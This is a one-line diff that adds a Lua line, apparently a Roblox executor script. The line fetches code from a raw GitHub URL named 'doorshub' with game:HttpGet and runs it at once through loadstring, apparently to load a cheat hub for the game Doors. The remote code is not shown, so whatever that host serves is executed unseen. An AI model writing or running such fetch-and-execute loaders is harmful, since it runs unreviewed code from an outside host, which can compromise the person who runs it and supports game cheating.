@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/x77hhp9Ygk5Ufk6fkHlu6/hubs/main/hubss/hub/doorshub"))()
